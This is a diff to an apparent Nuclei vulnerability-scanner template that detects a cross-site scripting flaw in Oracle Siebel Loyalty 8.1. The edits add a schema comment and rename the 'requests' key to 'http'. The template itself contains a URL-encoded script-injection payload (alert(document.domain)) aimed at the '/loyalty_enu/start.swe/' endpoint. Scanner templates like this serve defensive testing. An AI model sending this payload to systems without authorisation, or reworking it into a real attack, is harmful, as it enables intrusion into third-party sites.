@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: oracle-siebel-xss
 info:
   name: Oracle Siebel Loyalty 8.1 - XSS Vulnerability
@@ -6,7 +7,7 @@ info:
   description: A vulnerability in Oracle Siebel Loyalty allows remote unauthenticated attackers to inject arbitary Javascript code into the responses returned by the '/loyalty_enu/start.swe/' endpoint.
   reference: https://packetstormsecurity.com/files/86721/Oracle-Siebel-Loyalty-8.1-Cross-Site-Scripting.html
   tags: xss,oracle
-requests:
+http:
   - method: GET
     path:
       - '{{BaseURL}}/loyalty_enu/start.swe/%3E%22%3E%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
